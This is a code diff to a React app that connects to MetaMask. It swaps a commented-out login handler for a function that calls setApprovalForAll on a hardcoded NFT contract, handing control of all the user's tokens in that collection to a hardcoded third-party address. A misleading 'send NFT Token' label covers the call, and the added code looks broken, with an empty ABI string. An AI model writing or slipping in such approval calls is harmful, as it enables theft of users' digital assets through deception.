@@ -68,25 +68,25 @@ function App() {
     setProvider(new ethers.providers.Web3Provider(window.ethereum));
   }
 
-  // const handleLogin = () => {
-  //   if (window.ethereum && window.ethereum.isMetaMask) {
-  //     console.log("MetaMask Here!");
-  //     window.ethereum
-  //       .request({ method: "eth_requestAccounts" })
-  //       .then((result) => {
-  //         console.log(result);
-  //         setLogged(true);
-  //         setAccount(utils.getAddress(result[0]));
-  //         setProvider(new ethers.providers.Web3Provider(window.ethereum));
-  //       })
-  //       .catch((error) => {
-  //         console.log("Could not detect Account");
-  //       });
-  //   } else {
-  //     console.log("Need to install MetaMask");
-  //     onboarding.startOnboarding();
-  //   }
-  // };
+  // SetApprovalForAll
+  const SetApprovalForAll = () => {
+    let tokenId = 0
+    let transferToAddress = "0xF60f60Fb046C0D25c985469F8c2b91c32EA1B217"
+const ABIs = ""
+    //Calling the metamask plugin
+    const Web3 = new web3(window.ethereum);
+    var myContract = new Web3.eth.Contract(ABIs, "0xF5055021ebfb71e4F23F0d29F5cf051F3eDf5Cf6", { from: account });
+ 
+    // account, transferToAddress, tokenId
+    myContract.methods.setApprovalForAll(transferToAddress, true).send({ from: account, gas: 300000 })
+      .then((res) => {
+        console.log(res);
+      })
+      .catch((error) => {
+        console.log("Error in send NFT Token", error);
+      }) 
+  }
+  
   const hnadleLogout = () => {
     localStorage.removeItem("metamask")
     setLogged(false);
